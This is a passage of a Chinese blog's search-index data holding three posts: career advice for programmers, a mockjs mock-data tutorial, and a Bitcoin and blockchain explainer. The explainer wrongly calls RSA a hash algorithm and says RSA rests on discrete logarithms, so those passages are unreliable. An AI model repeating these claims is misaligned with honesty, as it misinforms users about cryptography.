不要谈过多的女朋友，谈女朋友要看准，下手要稳准狠。我谈过2个女朋友，平均每个女朋友身上的开支前后大概会有10万左右，还好我不用谈第3个女朋友了，若投资失误，那也是很残忍的，谈女朋友也会消耗很多时间精力、还会消耗很多金钱，实话的讲的确是这样的，人家女孩子也值钱啊，凭什么就那么轻易的跟你啊，我跟第一个朋友分手时，我的生活至少是倒退了3-4年，一切从零开始，一切从头开始，我劝大家谈女朋友是人生最大的一笔买卖，投资失误会有惨痛的后果，不仅仅是金钱上的损失，更会有精神、心灵上的沉重打击，大家要学会珍惜女朋友，要学会哄好女朋友，让老婆开心每一天，虽然鱼儿上钩了，不用再下鱼饵了，偶尔也别忘记放点米，这个鱼要是脱钩了，那不是开玩笑的。 05. 工作不要更换得太过于频繁，选好了行业方向最好别更换太频繁。换工作，换行业方向，就像熊掰苞米一样的道理，有时候是丢了芝麻捡西瓜，有时候是丢了西瓜捡芝麻，这个道理我就不多讲了，大家都应该能明白的。 06. 要对身边的人好，要得到老板的信任、同事的认可及支持、珍惜良好的工作环境。有个朋友的QQ名字很有意思，“只爱陌生人”，陌生人是很有意思，但是最关键时刻，还是需要靠非陌生人，你每天跟同事一起生活，要维系好身边的人。你的成功与失败，往往是你身边的30-40个人决定的。你就是世界首富，他身边也是那么不超过100个人的在左右着他的生活，当你工作10年了，没一个老板信任你，没几个要好的同事朋友，那你惨了，你在这个世界上已经是很孤单了，你的收入，其实大多是来自这些身边的朋友给你介绍的生意，不大会网上掉几个馅饼的。 现在你身边的人有可能在不久的将来，给你提供很多好机会。 07. 钱很重要，但是生活质量比钱还重要，工作是很重要，但是家人比工作还重要。钱不是万能的，但是没钱是万万不能的。钱赚了，身体夸了，全送给医院了，钱赚了，身心疲惫了，人活着为了啥？不就为了开开心心生活嘛？工作重要，但是失去了家人的爱，失去了女朋友，失去了老婆孩子，那这个工作有啥用了？工作很容易就换了，家人是换不了的，老婆不是想换就换的，孩子不是想换就换的，连自己的家庭都不负责的人，怎么可能对公司负责呢？我一直是这个观念，来面试时觉得工作更重要的，我们一般不录取的，那太假了，或者太不懂事了。 08. 工作累了，也别太贪玩，有时候还是需要多想想如何才能赚钱。时间一晃就过去了，工作累了是可以适当放松，但是别太贪玩，10年很容易就过去了，10年后你要买房子，要娶老婆，要买车子，要生娃娃，身体也会变得脆弱一些，需要良好的生活习惯，也经不起通宵了，通宵一次，你要低迷好几天才能缓过劲儿来，跟20刚出头完全不一样了，用钱的地方多了去了，父母也会变得更老一些，可能也需要你的照顾，整个家子都指望你赚钱，别到了这个时候，你才意识到赚钱是那么的重要，更何况现在城市的房价，动不动就是100万，加上按揭的利息，你很可能需要支付150万。还可能需要装修，买车子。可能你身上的压力是200万。别觉得谈钱就俗，你要学会赚钱，要有个需要赚钱的良好意识，当然你出身富裕家庭，就不用考虑这些因素了。 09. 每天一点点进步，每月一点点积累，要敬业要爱业，我们给别人提供的也是服务。总有一天，你也会有累的时候，你也会有老的时候，这时候，你要靠啥呢？就要靠你平时的积累，你10年的积累，可以打倒很多竞争对手，他们再厉害，再怎么样，也很难抵得过你10年的积累，特别是后面5-10年的积累，成果会很明显，前面的1-5年，算是做软件的入门吧，除非你有高人指点，那可能2-3年就可以修成正果，软件在将来还是会值钱的，以为生活会越来越智能化，越来越数字化，软件的需求还是很有前途，最起码未来的10-20年里不用太担心失业问题了。 10. 对程序员来讲，开发思想、架构、代码就是财富，别老丢弃你的劳动成果，要学会保护你的劳动成果。我大概7-8年前的代码都在手上，经常改进来改进去，维护来维护去，在一定的程度上，让我生活轻松了不少，因为我不用什么都从头来过，我只要痛苦一次，以后就要反复重复利用，软件的价值在于重复利用，而不是每个东西，都从头开发，那永远也是辛苦的程序员，这个生活质量就别提了，不管自己的代码丑还是拿不出手，要学会精心维护，每天改进一点点，每个月一个小进步，每年一个大进步，多年的积累是宝贵的，这个早晚也会给你带来丰厚的收益。 11. 当程序员要防止原地踏步，不是工作年限长了，经验就丰富了，能力就强了，年纪越大工作越难找。我有一个朋友跟我开玩笑，工作5年的人，可能能力差距会很大，为什么呢？因为第一年他们干的事情都是一样的，都写程序了，2个人可能由于价值观不一样，5年后差距会很大，甚至是大到无法追赶的程度，为啥？因为还有机会的因素在里面，有的人干了5年，还是在原地踏步，天天只会写那些添加、删除、修改的代码。那你得注意了，需要不断的提高自己，才是硬道理。例如你会SQLServer，那要试着学习Oracle，你是做C/S的，那得需要提高到B/S的，你是做单机软件的，那得需要提高到网络软件，你只关注自己的工作的，需要学会管理，关心他人的工作。你是当程序员的，要试着提高当项目经理、部门经理，公司的总监等等，人有野心有目标才会不断进步，最俗的为了多赚钱，提高工作职位工作岗位，工作单位，也是可以理解的。 年纪越大工作越难找，例如3-4千的工作是随便找找，玩一样，但是你30过后，最起码要找月薪上1万的工作，这样的工作是机会也少，一般小公司也给不起，还得找个好公司才可以，好公司又不是天天招聘人，天天缺好的工作岗位，说不好听点儿，小公司的老板才赚多少啊？他来钱也很不容易的，小池塘就不好容得下大鲨鱼了。 12.当创业的收入比打工还少时，那就别创业，要找比自己能力强的人创业，你不会吃亏。创业的收入，比打工还少，那就是瞎扯蛋，恶搞。创业的真正意思并不是要你去吃苦没钱赚，那是忽悠无知的人的。当你创业时的收入，比打工还多，那你可以考虑创业，没有工资什么的，股份啥的，都是瞎扯蛋。 不要跟自己能力还弱的人一起创业，那损失最大的，很可能就是你，要创业，也要找比自己强的人一起创业，最起码赚不到钱，还能学到不少。不会有过多的损失。别热血一沸腾就创业了，创业了，也别烧自己的钱，家人的钱，那是很不抗烧的，没几下几十万就烧干了。 其实打工，也是创业的开始，每个月都能拿到钱，还可以学到知识，什么公司的股份都是空话，没几个小公司能成功，开起来了也走不了3年就分家了，都忽悠小孩子玩的，除非真的有科技含量或者是客户资源的，否则股份是一文钱不值的，就算创业每个月也按时拿工资才是硬道理。 13. 未来的生活节奏会更快，生活压力会更大，竞争会更激烈，社会服务体系会更完善。在未来，我们享受良好的服务的同时，也会为别人提供更良好的服务，需要在技能上还是服务质量上的要求会更高更严格。平时要注意提高自己，不要被时代淘汰掉，我从小的朋友，一波又一波被社会无情的淘汰了，很小的时候，我出生在大草原与大山的交界处，我小时候的玩伴，还在大山里，我跟着家人杀出来了，我小学、中学、大学、工作上的、这10年，我一直很坚强的拼搏下来，很不容易的在杭州立住脚了，说实话，参加工作后的十年，也是不断拼搏，不断提高的十年。","link":"/2018/11/15/【收藏】黎活明给程序员的忠告/"},{"title":"前端开发中使用mockjs模拟数据","text":"mock拦截Ajax请求，生成随机数据 模拟数据 直接生成模拟数据 1Mock.mock(模板|function) 为接口地址模拟数据 1Mock.mock(url,模板|function) 为接口以及请求方式模拟数据 1Mock.mock(url,type,模板|function) 说明：url也可以是一个字符串也可以是一个正则。 模板语法模拟数据时要根据模板来模拟，模板是一个对象类型的值，格式为： 1'名称|规则':'值' 名称：模拟的数据的名字。值：模拟的数据的值。规则：模拟出数据的规则，常用的几个规则： min-max：生成的范围 count：生成的数量 +step：递增step 生成随机数据 Type Method 基本类型 boolean, natural, integer, float, character, string, range, date, time, datetime, now 图片 image, dataImage 颜色 color 文本 paragraph, sentence, word, title, cparagraph, csentence, cword, ctitle 姓名 first, last, name, cfirst, clast, cname 网站 url, domain, email, ip, tld 地址 area, region 编号 guid, id 使用时我们只需要把值设置成 @方法名 即可 1.生成boolean @boolean 2.生成数字 2.1 自然数(&gt;=0整数) @natural @natural(min,max) 2.2 整数 @integer @integer(min,max) 2.3小数 @float @float(min,max,dmin,dmax) dmin：小数部分位数最小值 dmax：小数部分位数最大值 2.4 整数整组 @range(min,max) @range(min,max,step) step：递增的步长 @range(10) // =&gt; [0, 1, 2, 3, 4, 5, 6, 7, 8, 9] @range(3, 7) // =&gt; [3, 4, 5, 6] @range(1, 10, 2) // =&gt; [1, 3, 5, 7, 9] @range(1, 10, 3) // =&gt; [1, 4, 7] 3.生成文本 3.1单个字符 @character @character(&apos;lower/upper/number/symbol&apos;) @character(pool) ​ 如果传入了 `&apos;lower&apos;` 或 `&apos;upper&apos;`、`&apos;number&apos;`、`&apos;symbol&apos;`，表示从内置的字符池中选取一个字符： { lower: &quot;abcdefghijklmnopqrstuvwxyz&quot;, upper: &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;, number: &quot;0123456789&quot;, symbol: &quot;!@#$%^&amp;*()[]&quot; } 3.2字符串 @string @string(length) @string(min,max) 3.3英文单词 @word @word(length) @word(min,max) 3.4英文句子 @sentence @sentence(len) @sentence(min,max) 3.5英文段落 @paragraph @paragraph(len) @paragraph(min,max) 3.5中文汉字 @cword @cword(pool) @cword(len) @cword(pool,len) @cword(min,max) @cword(pool,min,max) @cword() // =&gt; &quot;干&quot; @cword(&apos;零一二三四五六七八九十&apos;) // =&gt; &quot;六&quot; @cword(3) // =&gt; &quot;别金提&quot; @cword(&apos;零一二三四五六七八九十&apos;, 3) // =&gt; &quot;&quot;七七七&quot;&quot; @cword(5, 7) // =&gt; &quot;设过证全争听&quot; @cword(&apos;零一二三四五六七八九十&apos;, 5, 7) // =&gt; &quot;九七七零四&quot; 3.6中文句子 @csentence @csentence(len) @csentence(min,max) 3.7中文段落 @cparagraph @cparagraph(len) @cparagraph(min,max) 3.8中文标题 @ctitle @ctitle(len) @ctitle(min,max) 4.生成名字 4.1英文名 @first 名 @last 姓 @name 姓名 @name(middle) middle：是否生成中间名字 @name() // =&gt; &quot;Larry Wilson&quot; @name(true) // =&gt; &quot;Helen Carol Martinez&quot; 4.2中文名 @cfirst 姓 @clast 名 @cname 姓名 @cname() // =&gt; &quot;袁军&quot; 5.网站 5.1生成一个IP @ip 5.2生成一个Email @email @email(domain) domain：指定域名 @email() // =&gt; &quot;x.davis@jackson.edu&quot; @email(&apos;nuysoft.com&apos;) // =&gt; &quot;h.pqpneix@nuysoft.com&quot; 5.3生成域名 @domain 5.4生成URL @url @url(protocol,host) protocol：指定协议，例如HTTP host：指定域名 @url() // =&gt; &quot;mid://axmg.bg/bhyq&quot; @url(&apos;http&apos;) // =&gt; &quot;http://splap.yu/qxzkyoubp&quot; @url(&apos;http&apos;, &apos;nuysoft.com&apos;) 6.生成时间 6.1基本用法 @date @time @datetime 6.2格式化时间 可以通过 format 参数设置时间的格式 @date(format) @time(format) @datetime(format) | Format | Description | Example | | ------ | -------------------------------------------------------- | ------------ | | yyyy | A full numeric representation of a year, 4 digits | 1999 or 2003 | | yy | A two digit representation of a year | 99 or 03 | | y | A two digit representation of a year | 99 or 03 | | MM | Numeric representation of a month, with leading zeros | 01 to 12 | | M | Numeric representation of a month, without leading zeros | 1 to 12 | | dd | Day of the month, 2 digits with leading zeros | 01 to 31 | | d | Day of the month without leading zeros | 1 to 31 | | HH | 24-hour format of an hour with leading zeros | 00 to 23 | | H | 24-hour format of an hour without leading zeros | 0 to 23 | | hh | 12-hour format of an hour without leading zeros | 1 to 12 | | h | 12-hour format of an hour with leading zeros | 01 to 12 | | mm | Minutes, with leading zeros | 00 to 59 | | m | Minutes, without leading zeros | 0 to 59 | | ss | Seconds, with leading zeros | 00 to 59 | | s | Seconds, without leading zeros | 0 to 59 | | SS | Milliseconds, with leading zeros | 000 to 999 | | S | Milliseconds, without leading zeros | 0 to 999 | | A | Uppercase Ante meridiem and Post meridiem | AM or PM | | a | Lowercase Ante meridiem and Post meridiem | am or pm | | T | Milliseconds, since 1970-1-1 00:00:00 UTC | 759883437303 | 生成地址1234567891011121314151617181920212223242526272829303132333435367.1生成中国大区@region@region() // =&gt; \"华北\"7.2生成省份@province 7.3生成城市@city @city(prefix) prefix：布尔值，是否生成所属的省 @city()// =&gt; \"唐山市\"@city(true)// =&gt; \"福建省 漳州市\"7.4生成县@county @county(prefix) prefix：布尔值，是否生成所属省、 @county()// =&gt; \"上杭县\"@county(true)// =&gt; \"甘肃省 白银市 会宁县\"7.5生成邮政编码 @zip 8.编号 8.1身份证 @id @id() // =&gt; &quot;420000200710091854&quot; 8.2GUID @guid @guid() // =&gt; &quot;662C63B4-FD43-66F4-3328-C54E3FF0D56E&quot; 9.生成图片 9.1图片URL @image() @image( size ) @image( size, background ) @image( size, background, text ) @image( size, background, foreground, text ) @image( size, background, foreground, format, text ) size：尺寸，格式为：&apos;宽x高&apos; background：背景色，格式为：#FFFFFF text：图片上显示的文本 foreground：广本颜色 format：图片格式，可选值包括：png、gif、jpg。 @image // =&gt; &quot;http://dummyimage.com/125x125&quot; @image(&apos;200x100&apos;) // =&gt; &quot;http://dummyimage.com/200x100&quot; @image(&apos;200x100&apos;, &apos;#fb0a2a&apos;) // =&gt; &quot;http://dummyimage.com/200x100/fb0a2a&quot; @image(&apos;200x100&apos;, &apos;#02adea&apos;, &apos;Hello&apos;) // =&gt; &quot;http://dummyimage.com/200x100/02adea&amp;text=Hello&quot; @image(&apos;200x100&apos;, &apos;#00405d&apos;, &apos;#FFF&apos;, &apos;Mock.js&apos;) // =&gt; &quot;http://dummyimage.com/200x100/00405d/FFF&amp;text=Mock.js&quot; @image(&apos;200x100&apos;, &apos;#ffcc33&apos;, &apos;#FFF&apos;, &apos;png&apos;, &apos;!&apos;) // =&gt; &quot;http://dummyimage.com/200x100/ffcc33/FFF.png&amp;text=!&quot; 9.2Base64图片编码 @dataImage @dataImage(size) @dataImage(size,text) 10.生成颜色 @color @hex @rgb @rgba @hsl","link":"/2018/11/15/前端开发中使用mockjs模拟数据/"},{"title":"区块链分享","text":"文章转载自薛国良老师的博客，点击跳转 区块链行业现状 政府关注 企业极力研究 学术取得共识 学校和培训机构设立学科 资方积极参与 争先恐后炒币 技术不完善 借区块链热点的传销和骗局横行 区块链为什么会有如此魅力，让全社会都在关注它？区块链技术是本质是不可篡改的、去中心化的公开账本，是记账方式的进步。记账是社会生产生活的基石，记账方式的进步，能推动社会进步。 记账就是确权财富有各种各样的属性，最主要的属性，就是属于属性，也就是说这个财富是属于谁的。任何财富都有权利属于属性： 纸币通过实物确权 存款通过中心化银行记账确权 房产则通过中心化政府颁发房产证确权 财富转移财富不流通没有价值，通过交易大家各取所需，才能过上幸福生活。每种财富转移方式，也跟确权方式紧密相连： 纸币：通过传递实物货币转移 存款：通过修改中心化账本转移 房产：通过中心化政府办理过户手续，来进行财富转移 比特币价值作为货币，比特币可以和现金、银行存款作比较。 比较 现金 中心化记账(银行) 去中心化记账(比特币) 确权 实物确权 中心化记账确权 去中心化记账确权 转移 需要面对面传递，受地理位置限制 转账方发送指令到中心服务器，中心服务器修改账本实现财富转移，接收方不需要任何操作，转账不受地理位置限 转账方发送指令到比特币网络，由比特币网络实现对账本进行修改 限制 现金的使用不受限 中心化账本的使用，经常受限制 比特币的使用不受限 比特币是自由财富，它可以点对点的转移，不受中心节点管控，这很像现金；但比特币的转移不受地域限制，这很像中心化记账的存款。比特币结合了两者的优势，这是比特币价值所在。 比特币实现通过上述分析，比特币是通过去中心化的存储网络来记录账本，并且在这个基础上，实现点对点的财富转移功能。比特币要实现以上功能有几个难点： 账本公开保存在网络上，如何保证正确性 当有新的转账产生时，谁来实施记账区块链数据结构 比特币首次使用了区块链这种数据结构，这种数据结构通过哈希算法，锁定数据的方式，保证数据不被篡改。 区块链可以拆分成两个词语：区块、链。如果把区块链比做一本笔记本，那么区块就是笔记本的一页纸，这些纸上面记录了很多转账信息。为了保证区块所记录的转账信息不被篡改，每个区块都锁定上一块区块的内容。一旦某个区块被篡改，会出现连环雪崩效应，要修改后面所有的区块来掩盖非法修改。如果希望修改的区块能被其他节点认可，需要做繁重的运算来让其他节点确认，这基本不可能。 比特币系统认为，一旦区块被六个区块锁定，这个数据就不可能被篡改了。 哈希算法哈希算法是一类算法，它的作用是获得数据的指纹（一个整数），常见的哈希算法有 RSA、RIPEMD160、SHA3 等等。对数据 x 进行哈希运算，得到结果 y，可以记作 $$ H(x) = y$$ 。 x 可以代表一个数，或者是任意大小(比如 2G 的文件)，无论是什么样的 x，通过哈希运算之后得到相应的整数 y。 如果有 $$ H(x_1) = y_1 $$ 和 $$ H(x_2) = y_2 $$ ，那么可以认为： 对于不同的 $$x_1$$和 $$x_2$$ ， $$y_1$$ 和 $$y_2$$ 是不同的。 如果 $$y_1$$和$$y_2$$相同，那么可以认为 $$x_1$$ 和 $$x_2$$ 是相同的。 哈希算法经常用来验证文件完整性，当我们从互联网下载一个很大的文件（比如系统安装盘），那么下载网站通常会提供一个 RSA 运算的哈希值，用于校验文件的完整性。当文件下载完毕之后，使用对应的哈希算法，计算该文件的哈希值，如果和下载网站提供的哈希值相同，那么意味着下载的文件是完整的。 哈希值在区块链中，其中一个作用是，在区块中保存上一个区块的哈希值，用于锁定上一块区块数据的完整性。 确权比特币是比特币网络（或者叫做比特币系统）的记账单位，记账除了记录财富数量之外，还要记录财富属于谁这个属性，在比特币系统中，使用非对称加密技术来对比特币进行确权。 比特币系统没有中心节点，因此比特币系统开户，不需要到某个组织去登记，只需要自己随机生成一串密钥作为自己的账户，这个密钥我们称之为私钥。然后使用私钥，根据椭圆曲线非对称加密算法规则，生成私钥对应的公钥，再使用公钥，生成比特币钱包地址。用户可以将自己的钱包地址公布于众，用于接收比特币财产，在区块链中，使用钱包地址来进行确权。 使用钱包地址确权的比特币，只有对应的私钥，才能够将其解开，并进行再次转移。因此私钥是非常重要的信息，不可暴露给其他人或者丢失。如果私钥暴露或者丢失，意味着财富的不安全，并且无法找回密码。 非对称加密加密算法很早就有，通过一些算法，将信息隐藏起来，早期加密依靠加密算法，也就是算法泄漏了，加密也就被破解了。现代加密保障不在于算法，在于密钥，算法是公开的，只要保存好密钥，就保证了加密安全。 有些算法，加密密钥和解密密钥是一致的，这种加密算法叫做对称加密，典型的对称加密算法有 AES (高级加密标准)。对称加密算法速度很快，不过密钥交换存在隐患。 1977年，三位数学家设计了 RSA 加密算法，这个加密算法的加密和解密使用不同的密钥。两个密钥分别称为私钥和公钥。使用公钥加密的密文，私钥可以解密；使用私钥加密的密文，公钥可以解密。如果你想进行加密通信，只要把公钥公布于世，私钥则之有自己持有，这样任何人都可以使用公钥进行加密之后，再进行传输，其他人使用公钥无法对数据进行解密，只有持有私钥的人才可以解密。 非对称加密基于这样的数学原理：$$f(x) = y$$ 的计算很简单，但是 $$ f(y) = x $$ 很难。只要符合这种情况的数学式，都可以作为非对称加密的基础。RSA 基于离散对数，后来数学家们发明了更难于破解的 ECC（椭圆曲线非对称加密算法），比特币中使用的就是 ECC 算法。 非对称加密算法虽然很厉害，但是一次能加密的数据有限，如果一个很大的文件需要使用非对称加密算法来进行加密，那么性能是很差的。在秘密通信过程中，非对称加密通常只用于交换对称加密的密钥。 数字签名非对称加密还可以用于数字签名，当 A 发表一篇文章，然后使用哈希算法计算文章的哈希值，再用 A 的私钥对哈希值进行加密，加密的结果就是这篇文章的数字签名。其他人可以用 A 的公钥，来解密数字签名，如果解密的结果，正是这篇文章的哈希值，那么这篇文章一定是 A 写的，并且文章内容没有被篡改过。 数字签名可以保证数据不可抵赖，比如 A 发送转账信息给 B，然后 A 可以抵赖，说我没有发过，这个数据不知道谁发的。但是如果 A 发送的数据中，包含数字签名的话，那么 A 就不可以抵赖了。 签名过程：$$y = Sign(A, x) = Encrypt( Hash(x), A_{priKey} )$$ 验证过程：如果 $$Decrypt(y, A_{pubKey}) == Hash(x)$$ 成立，那么可以称为，x 是 A 发布的信息，中间没人篡改。 转移、验证、记账财富需要流动才有意义，如果 A 想将比特币财富转移给 B，这个过程，需要 A 的私钥和 B 的钱包地址才可以进行。A 通过脚本 S1 将自己的财富解锁，然后给需要转移部分财富，附上一段脚本 S2，S2 脚本只有 B 的私钥才能够执行。 如果 A 不是个诚实的人，那么他可以利用网络延迟，将自己的一份财富，同时转给 B 和 C，这种攻击被称为 双花 攻击。在中心化世界里，双花攻击的防护由中心节点完成。在比特币系统里，没有中心节点存在，为了避免这种攻击，比特币系统会选举一个临时的验证节点，来验证财富转移请求的合法性。选取临时节点的游戏规则是，哪个节点计算出哈希值符合规则，那么那个节点就拥有了此次记账的权利，所有比特币节点都尊重这个游戏规则，不尊重游戏规则的节点，将会被踢出比特币网络。 分叉为了避免双花攻击，需要临时选取临时节点进行转账验证，这些竞争记账权的节点称之为矿工，竞争的过程称之为挖矿，竞争成功的矿工，可以为系统增加区块，并且在这个区块中，给自己奖励比特币。 如果两个矿工同时宣布挖矿成功，那么会出现两个后缀区块的情况，这种情况称之为分叉。比特币并不倾向两个分叉中的任何一个，而是搁置争议，继续运行，经过一段时间的竞争之后，总有一个链的长度会比另外一个链长，而比特币系统，只认可比较长的链。 渐进式共识的思维，在比特币中非常重要，对区块链未来的发展，也是很有指导意义的。 智能合约上文中提到，比特币的转账，是通过脚本来执行的，如果丰富这些脚本功能，加上一些判断条件，那么转账就成为有条件的转移，这种条件是双方的某种约定，或者叫做合同。这种可编程的交易，用于规范和约定双方的行为，比当前世界中，纸质的合同更加有执行效率。比特币的脚本功能偏弱，因此才会有号称区块链 2.0 的以太坊的崛起。 比特币的伟大和欠缺比特币是伟大的发明，创造了自由的货币体系，把传递消息的互联网升级为传递价值的区块链网络，并且这个网络在没有任何管理员管理的情况下，安静的运行了 10 年，没有大的事故发生。但是作为第一代区块链应用，比特币还是有考虑不周的情况： 比特币的开发和维护者，无法在系统运行过程中持续收益，导致了比特币软件升级乏力。 比特币为了体现去中心化，创始人都匿了，导致没有人管理和规划比特币系统未来。 比特币追求通过繁重的工作量证明来争夺记账权，避免了黑客攻击，但是耗费很多电力资源。 比特币繁重的工作是计算哈希值，而很多人通过近似作弊的手段，提高算力获益。 比特币为了提高安全性，动态调整哈希计算难度，将出块速度限制为 10 分钟左右，并且限制区块数据大小为 1 M，导致性能低下。 模仿者和创新者由于比特币源代码是开源的，任何人可以轻松获得源代码，在比特币基础上，稍作修改，换个名字，发行一种新的虚拟货币，这种币称之为“山寨币”。最成功的“山寨币”是莱特币，目前在虚拟货币世界里，市值排名第七，它修改了出块时间和区块尺寸，交易速度加快，在 2013 年推出并获得认可和成功。 现在新的山寨币已经不太可能获得市场认可，因此一些山寨币，并没有创世块，而是从比特币的某一区块进行分叉，在分叉处实行新的游戏规则，并且承认之前比特币账户的资产，通过空投方式给这些比特币账户发送对应的新币，这些新币称之为“分叉币”，分叉币也是山寨币，不同的是它已经有相应的比特币用户了，相对容易获得市场任何。分叉币成功的典型是比特现金，目前市值排名第四。 还有一些程序员，参考比特币实现，重新调整游戏规则，并增加业务功能，这种虚拟货币不能称之为“山寨币”，而是一种新的公链，成功的典型是以太坊，目前以太坊市值仅次于比特币，被业界称之为“区块链 2.0”。 以太坊以太坊很多和比特币一样，包括非对称加密算法的选择，工作量证明共识算法，它的伟大在于，完善了比特币的脚本功能，实现了图灵完备的智能合约功能。图灵完备的智能合约使得以太坊除了具有去中心化货币功能之外，还有合约功能。如果说比特币是全球账本，那么以太坊就是全球计算机。如果把比特币当成一本本子，那么以前记账全靠口算，而以太坊则是一本本子加上一个计算器。除了业务先进之外，以太坊的创始人作为一面旗帜，指导者以太坊前进的方向。在经济系统方面，以太坊引入 gas 概念，使得以太币有了使用价值，也比比特币更进一步。 区块链应用和发展记账和传递价值记账和传递价值，是区块链最基本的应用，比特币是典型，基于区块链的货币，是一种更好的货币。 智能合约使用智能合约来约束人们的行为，并且在智能合约中，对不遵守合约的人，实施惩罚，这样可以降低信任成本，提高合作效率。 存储区块链网络中的节点，都是物理电脑，这些电脑可以携带大规模存储，为区块链系统存储信息。信息保存到区块链上有诸多好处： 永远在线 价格便宜 数据安全 无法被监管 网络网络属于另一个方面的基础建设，目前区块链网络是平等的对等网络，通信完全靠喊（广播），规划好网络，也就是建立局部网络通信，建立子网，用于提高区块链性能，是很重要的一个方向。 互联网当区块链系统中的存储和网络规划完成时，互联网的许多应用会被迁移到区块链系统，阿里云等各种提供云存储和计算的公司成为历史，类似淘宝也会直接上区块链，并且物品是使用虚拟货币结算的。 物联网如果区块链不和物相关，那么区块链应用永远在信息、虚拟领域发挥作用。当物联网和区块链关联起来，让更多的确权、交易，落地到物品上时，区块链将无处不在。 经济系统不发币的区块链是没有生命力的，在区块链上有了币之后，就要考虑游戏规则，如果游戏规则不公平，那么对应的链很快没有用户。 区块链系统设计步骤： 链必须有经济效益 链产生的经济效益应该体现在链上的电子货币上 确定参与系统的角色 为每个角色的活动，定义奖励和惩罚措施 分析、测试、验证 回到第 4 步调整 经济系统设计其实类似游戏中的数值策划，把经济系统设计成为合理的系统，对于公链来说至关重要。","link":"/2018/11/15/区块链分享/"}],"tags":[{"name":"laravel","slug":"laravel","link":"/tags/laravel/"},{"name":"php","slug":"php","link":"/tags/php/"},{"name":"markdown","slug":"markdown","link":"/tags/markdown/"},{"name":"javascript","slug":"javascript","link":"/tags/javascript/"},{"name":"Nuxt","slug":"Nuxt","link":"/tags/Nuxt/"},{"name":"Vue","slug":"Vue","link":"/tags/Vue/"},{"name":"css3","slug":"css3","link":"/tags/css3/"},{"name":"cropper","slug":"cropper","link":"/tags/cropper/"},{"name":"Git","slug":"Git","link":"/tags/Git/"},{"name":"html5","slug":"html5","link":"/tags/html5/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"生活杂谈","slug":"生活杂谈","link":"/tags/生活杂谈/"},{"name":"正则表达式","slug":"正则表达式","link":"/tags/正则表达式/"},{"name":"mockjs","slug":"mockjs","link":"/tags/mockjs/"},{"name":"区块链","slug":"区块链","link":"/tags/区块链/"}],"categories":[{"name":"后端","slug":"后端","link":"/categories/后端/"},{"name":"前端","slug":"前端","link":"/categories/前端/"},{"name":"Geek","slug":"Geek","link":"/categories/Geek/"},{"name":"生活","slug":"生活","link":"/categories/生活/"}]}